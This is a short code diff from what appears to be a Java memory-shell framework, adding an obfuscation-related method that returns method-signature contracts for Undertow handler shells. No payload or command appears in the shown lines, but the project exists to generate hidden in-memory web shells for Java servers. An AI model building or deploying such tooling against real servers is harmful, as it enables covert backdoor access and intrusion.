@@ -1,7 +1,10 @@
 package com.reajason.javaweb.memshell.server.undertow;
 
+import com.reajason.javaweb.memshell.obfuscation.MethodContracts;
+import com.reajason.javaweb.memshell.obfuscation.MethodSignature;
 import com.reajason.javaweb.memshell.server.AbstractServer;
 import com.reajason.javaweb.memshell.server.InjectorMapping;
+import java.util.Set;
 
 import com.reajason.javaweb.utils.ShellCommonUtil;
 import net.bytebuddy.asm.Advice;
@@ -34,6 +37,14 @@ public class Undertow extends AbstractServer {
     @Override
     public Class<?> getListenerInterceptor() {
         return ListenerInterceptor.class;
+    }
+
+    @Override
+    public Set<MethodSignature> getShellMethodContracts(String shellType) {
+        if (HANDLER.equals(shellType) || JAKARTA_HANDLER.equals(shellType)) {
+            return MethodContracts.UNDERTOW_HANDLER_CONTRACTS;
+        }
+        return super.getShellMethodContracts(shellType);
     }
 
     @Override
